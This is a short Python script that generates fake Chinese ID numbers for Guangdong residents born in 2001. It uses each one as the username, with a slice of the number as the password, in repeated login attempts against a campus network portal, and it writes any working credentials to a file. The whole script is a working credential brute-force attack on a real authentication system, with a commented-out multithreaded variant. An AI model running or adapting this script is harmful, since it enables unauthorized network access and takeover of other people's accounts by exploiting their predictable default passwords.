# -*- codeing = utf-8 -*-
# @Time : 2021/9/1 6:57 下午
# @Author : renew
# @File : idTest.py
# @Software : PyCharm


from re import I
from turtle import back
from id_validator import validator
import requests
import threading

def idHit():
    id = validator.fake_id(True, '广东省', '2001')
    return id


def netHid(id, ip):
    url = "http://192.168.60.253:801/eportal/portal/login"
    headers = {

        "User-Agent": 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
    }
    data = {
        "callback": "dr1003",
        "login_method": "1",
        "user_account": id,
        "user_password": id[12:18],
        "wlan_user_ip": ip,
        "wlan_user_ipv6": "",
        "wlan_user_mac": "000000000000",
        "wlan_ac_ip": "192.168.30.253",
        "wlan_ac_name": "ZJXY_WS6816",
        "jsVersion": "4.1.3",
        "terminal_type": "1",
        "lang": "zh-cn",
        "v": "3078",
        "lang": "zh"
    }
    req = requests.get(url=url, headers=headers, params=data)
    return req.text
    # return '认证成功'


def hit(ip,textbox):
    while 1:
        id = idHit()
        textbox.insert("end", f"当前账号{id}\n")
        cent = netHid(id,ip)

        if '成功' in cent or 'in' in cent :
            print(cent)
            with open("zhanghao.txt","a") as f:
                f.write(str(id) + '\n')
                f.write(cent + '\n')
            textbox.insert("end", f"{cent}\n")
            break
        elif '系统忙' in cent or '不存在' in cent :
            print(id)
            pass
        else:
            textbox.insert("end", f"-----出问题！暂停了！------- {cent}\n")
            break


def main(textbox,ip,t_num):

    # l = []  # 子线程池
    # for i in range(int(t_num)): 
    #     t = threading.Thread(target=hit,args=(ip,textbox,))
    #     l.append(t)  # 将子线程添加到线程池统一管理
    #     t.start()
    # for k in l:
    #     k.join()
    hit(ip,textbox)
    



if __name__ == '__main__':
    pass